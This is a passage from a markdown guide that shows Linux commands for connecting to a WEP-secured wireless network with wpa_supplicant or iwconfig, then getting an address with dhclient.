	wep_tx_keyidx=0
}
EOF
```

```bash
sudo wpa_supplicant -c wep.conf -i wlan0
```

With the above still running, open a new terminal and run the following

```bash
sudo dhclient wlan0
```

### iwconfig

```bash
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode managed
```

```bash
sudo iwconfig wlan0 essid PixelForge key 1B2A5A4C6A
```

```bash
sudo iwconfig
```

```bash
sudo dhclient wlan0
```
